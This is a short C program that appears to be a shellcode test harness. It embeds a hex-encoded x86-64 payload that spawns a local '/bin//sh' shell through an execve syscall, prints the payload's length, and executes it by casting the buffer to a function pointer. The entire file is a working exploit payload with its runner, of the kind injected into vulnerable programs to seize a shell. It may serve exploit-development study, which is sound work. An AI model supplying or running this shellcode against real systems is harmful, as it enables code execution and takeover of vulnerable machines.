#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\x31\xf6\x56\x66\x68\x73\x68\x66\x68\x2f\x2f\x66\x68\x69\x6e\x66\x68\x2f\x62\x48\x89\xe7\x6a\x3b\x58\x0f\x05";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
